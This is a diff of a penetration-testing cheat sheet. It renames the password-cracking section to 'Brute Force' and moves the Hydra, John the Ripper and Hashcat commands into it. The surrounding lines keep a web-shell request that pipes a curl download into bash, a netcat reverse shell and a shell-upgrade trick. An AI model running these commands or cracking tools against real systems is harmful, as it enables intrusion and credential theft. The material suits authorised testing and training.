@@ -6,7 +6,7 @@ Overview
 2. - [Exploitation](#2---exploitation)
 3. - [Lateral Movement](#3---lateral-movement)
 4. - [Privilege Escalation](#4---privilege-escalation)
-5. - [Password Cracking](#5---password-cracking)
+5. - [Brute Force](#5---brute-force)
 6. - [Miscellaneous](#6---Miscellaneous)
 7. - [Online Resources](#7---online-resources)
 8. - [Browser Plugins](#8---browser-plugins)
@@ -158,30 +158,11 @@ http://<domain name>/shell.php?cmd=id
 http://<domain name>/shell.php?cmd=curl%20<IP address>:8000/shell.sh|bash
 ```
 
-- John The Ripper
-
-```
-$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
-$ john --show hashes.txt
-```
-
-- HashID
-
-```
-$ hashid <hash>
-```
-
 - Netcat
 
 ```
 $ nc -nlvp <port>
 $ nc -nv <IP address> <port> -e cmd.exe
-```
-
-- Tcpdump
-
-```
-$ sudo tcpdump -i <interface> port <port>
 ```
 
 - Host Files
@@ -190,29 +171,11 @@ $ sudo tcpdump -i <interface> port <port>
 $ python3 -m http.server 8000
 ```
 
-- Hydra
-
-```
-$ hydra -L <usernames.txt> -p '<password>' <IP address> ssh
-```
-
 - Escape Restricted Shell
 
 ```
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'; CTRL+Z; stty raw -echo; fg; export TERM=XTERM
 $ script /dev/null -c bash
-```
-
-- Zip2john
-
-```
-$ zip2john <ZIP file> > hashes.txt
-```
-
-- Hashcat
-
-```
-$ hashcat -a 0 -m 0 hashes.txt <wordlist>
 ```
 
 - Sqlmap
@@ -296,8 +259,39 @@ $ sudo -l
 $ export PATH=/tmp:$PATH
 ```
 
-#5. - Password Cracking
+#5. - Brute Force
 -----------------------------------------
+
+- HashID
+
+```
+$ hashid <hash>
+```
+
+- John The Ripper
+
+```
+$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
+$ john --show hashes.txt
+```
+
+- Hydra
+
+```
+$ hydra -L <usernames.txt> -p '<password>' <IP address> ssh
+```
+
+- Zip2john
+
+```
+$ zip2john <ZIP file> > hashes.txt
+```
+
+- Hashcat
+
+```
+$ hashcat -a 0 -m 0 hashes.txt <wordlist>
+```
 
 #6. - Miscellaneous
 -----------------------------------------
